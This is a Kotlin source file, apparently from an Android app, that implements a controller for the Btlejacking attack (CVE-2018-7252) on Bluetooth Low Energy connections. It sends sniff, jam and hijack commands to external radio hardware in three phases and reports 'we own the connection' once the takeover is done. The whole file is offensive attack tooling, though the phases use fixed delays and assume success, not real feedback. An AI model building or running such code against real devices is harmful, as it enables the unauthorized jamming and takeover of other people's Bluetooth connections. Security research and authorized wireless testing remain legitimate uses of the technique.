package com.hereliesaz.blusnu.data

import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch

/**
 * Enum representing the various states of a Btlejacking attack lifecycle.
 */
enum class BtlejackingState {
    IDLE,       // No active attack.
    SNIFFING,   // Hardware is sniffing for a new connection.
    JAMMING,    // Hardware is jamming the existing connection to force disconnect.
    HIJACKING,  // Hardware is attempting to take over the connection using sniffed parameters.
    CONNECTED   // Hijack successful, we own the connection.
}

/**
 * Module responsible for the Btlejacking attack (CVE-2018-7252).
 *
 * Btlejacking allows an attacker to hijack an active BLE connection.
 * It requires specialized hardware (e.g., nRF51822 with BtleJack firmware) because
 * standard Bluetooth chips cannot perform the required sniffing and precise jamming.
 *
 * This class acts as the controller for that external hardware, sending commands
 * via the [HardwareManager].
 *
 * @property hardwareManager Interface to the external radio hardware.
 */
class BtlejackingModule(private val hardwareManager: HardwareManager) {

    // Internal state flow to track the attack progress.
    private val _state = MutableStateFlow(BtlejackingState.IDLE)
    // Exposed immutable state flow for UI observation.
    val state = _state.asStateFlow()

    // Scope for background operations.
    private val scope = CoroutineScope(Dispatchers.IO + Job())
    // Handle to the current attack job, allowing cancellation.
    private var attackJob: Job? = null

    /**
     * Phase 1: Start sniffing for the target device's connection.
     *
     * @param target The device to target.
     */
    fun startSniffing(target: TargetDevice) {
        attackJob = scope.launch {
            _state.value = BtlejackingState.SNIFFING
            // Send the low-level command to the hardware dongle.
            // "sniff -t [MAC]" tells BtleJack to follow this specific advertiser.
            hardwareManager.sendCommand("sniff -t ${target.macAddress}")

            // Wait for the hardware to lock onto a connection.
            delay(5000) // Simulate sniffing duration/wait for lock.

            // If still in SNIFFING state (not cancelled), proceed to Phase 2.
            if (_state.value == BtlejackingState.SNIFFING) {
                startJamming()
            }
        }
    }

    /**
     * Phase 2: Jam the connection to force a supervision timeout.
     */
    private suspend fun startJamming() {
        _state.value = BtlejackingState.JAMMING
        // "jam" command tells hardware to emit noise on the active channels at the specific access address time slots.
        hardwareManager.sendCommand("jam")

        delay(3000) // Simulate jamming duration.

        // If still in JAMMING state, proceed to Phase 3.
        if (_state.value == BtlejackingState.JAMMING) {
            startHijacking()
        }
    }

    /**
     * Phase 3: Hijack the connection.
     * The legitimate central has disconnected due to jamming.
     * The attacker takes its place using the sniffed parameters (Access Address, CRCInit, HopInterval).
     */
    private suspend fun startHijacking() {
        _state.value = BtlejackingState.HIJACKING
        // "hijack" command initiates the takeover.
        hardwareManager.sendCommand("hijack")

        delay(2000) // Simulate hijacking duration.

        // If still in HIJACKING state, assume success.
        if (_state.value == BtlejackingState.HIJACKING) {
            _state.value = BtlejackingState.CONNECTED
            // Notify hardware we are in control.
            hardwareManager.sendCommand("connected")
        }
    }

    /**
     * Stops any active attack and resets the hardware.
     */
    fun stop() {
        // Cancel the coroutine job to stop the state transitions.
        attackJob?.cancel()

        scope.launch {
            _state.value = BtlejackingState.IDLE
            // Reset the hardware dongle.
            hardwareManager.sendCommand("stop")
        }
    }
}
